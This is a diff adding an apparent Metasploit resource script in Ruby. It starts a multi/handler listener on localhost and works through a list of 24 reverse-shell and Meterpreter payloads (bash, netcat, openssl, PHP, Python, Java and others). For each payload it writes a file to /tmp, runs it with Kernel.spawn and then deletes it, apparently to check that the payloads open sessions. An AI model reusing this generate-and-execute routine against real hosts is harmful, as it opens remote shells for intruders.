@@ -1,0 +1,91 @@
+<ruby>
+
+def create_multihandler(lhost, lport, payload_name)
+    run_single "use exploit/multi/handler"
+    run_single "set PAYLOAD #{payload_name}"
+    run_single "set LHOST #{lhost}"
+    run_single "set LPORT #{lport}"
+    run_single "exploit -j"
+end
+
+def run_payload(payload_name, lhost, lport)
+  cmd = ''
+  print_line "PAYLOAD=#{payload_name} LHOST=#{lhost} LPORT=#{lport}"
+  listener_job_id = create_multihandler(lhost, lport, payload_name)
+
+  filename = "/tmp/#{('a'..'z').to_a.shuffle.first(8).join}"
+  run_single "use payload/#{payload_name}"
+  run_single "set LHOST #{lhost}"
+  run_single "set LPORT #{lport}"
+  cmd << "chmod 700 #{filename}"
+  cmd << ";/usr/sbin/paxctl-ng -m #{filename}"
+  print_line "Payload stored in #{filename}"
+  if payload_name.start_with? "python"
+    payload_data = run_single "generate -t raw -f #{filename} "
+    cmd << ";python2 #{filename}"
+  elsif payload_name.start_with? "java"
+    payload_data = run_single "generate -t raw -f #{filename} "
+    cmd << ";java -jar #{filename}"
+  elsif payload_name.start_with? "ruby"
+    payload_data = run_single "generate -t raw -f #{filename} "
+    cmd << ";ruby #{filename}"
+  elsif payload_name.start_with? "php"
+    payload_data = run_single "generate -t raw -f #{filename} "
+    cmd << ";php #{filename}"
+  elsif payload_name.start_with? "linux"
+    payload_data = run_single "generate -t elf -f #{filename} "
+    cmd << ";#{filename}"
+  else
+    payload_data = run_single "generate -t raw -f #{filename} "
+    cmd << ";#{filename}"
+  end
+  cmd << ";rm #{filename}"
+  print_line "Exec Payload: #{cmd}"
+  Kernel.spawn(cmd)
+end
+
+lhost = '127.0.0.1'
+lport = rand(8000...9000)
+#filename = random_string = ('0'..'z').to_a.shuffle.first(8).join
+#filename = "/tmp/py2"
+
+
+# payloads = ['python/shell_reverse_tcp', 'linux/x64/shell_reverse_tcp'].each do |payload_name|
+payloads = [
+              'cmd/unix/reverse_awk',
+              'cmd/unix/reverse_bash',
+              'cmd/unix/reverse_netcat',
+              'cmd/unix/reverse_openssl',
+              'cmd/unix/reverse_perl',
+              'cmd/unix/reverse_python',
+              'cmd/unix/reverse_ruby',
+              'cmd/unix/reverse_zsh',
+              'generic/shell_reverse_tcp',
+              'java/jsp_shell_reverse_tcp',
+              'java/meterpreter/reverse_tcp',
+              'linux/x64/mettle/reverse_tcp',
+              'linux/x64/shell/reverse_tcp',
+              'linux/x64/shell_reverse_tcp',
+              'linux/x86/meterpreter/reverse_tcp',
+              'linux/x86/metsvc_reverse_tcp',
+              'linux/x86/mettle/reverse_tcp',
+              'linux/x86/shell/reverse_tcp',
+              'linux/x86/shell_reverse_tcp',
+              'php/meterpreter/reverse_tcp',
+              'python/meterpreter/reverse_tcp',
+              'python/meterpreter_reverse_tcp',
+              'python/shell_reverse_tcp',
+              'ruby/shell_reverse_tcp',
+]
+payloads.each do |payload_name|
+  lport += 1
+  run_payload(payload_name, lhost, lport)
+end
+
+#run_single "use payload/#{payload_name}"
+#run_single "set LHOST #{lhost}"
+#run_single "set LPORT #{lport}"
+#payload_data = run_single "generate -t raw -f #{filename} "
+#listener_job_id = create_multihandler(lhost, lport, payload_name)
+#Kernel.spawn("python2 #{filename} ; echo #{filename}")
+</ruby>
